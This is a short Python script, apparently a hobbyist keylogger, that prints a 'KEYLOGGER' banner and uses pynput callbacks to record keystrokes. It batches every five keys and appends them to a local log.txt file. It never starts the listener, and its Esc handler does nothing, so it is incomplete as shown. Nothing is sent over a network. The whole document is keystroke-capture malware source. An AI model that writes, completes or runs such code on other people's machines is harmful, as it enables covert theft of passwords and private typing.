import pynput

from pynput.keyboard import Key,Listener

count = 0
keys = []

print(" _  _________   ___     ___   ____  ____ _____ ____ ")
print(" | |/ / ____\ \ / / |   / _ \ / ___|/ ___| ____|  _ \ ")
print(" | ' /|  _|  \ V /| |  | | | | |  _| |  _|  _| | |_) | ")
print(" | . \| |___  | | | |__| |_| | |_| | |_| | |___|  _ < ")
print(" |_|\_\_____| |_| |_____\___/ \____|\____|_____|_| \_\ ")



def on_key_press(key):
    global count, keys
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

    print(key)

def write_file(keys):
    with open("log.txt", "a+") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                file.write("\n")
            elif not "key" in k:
                file.write(str(k))

def on_key_release(key):
    if key == Key.esc:
        pass
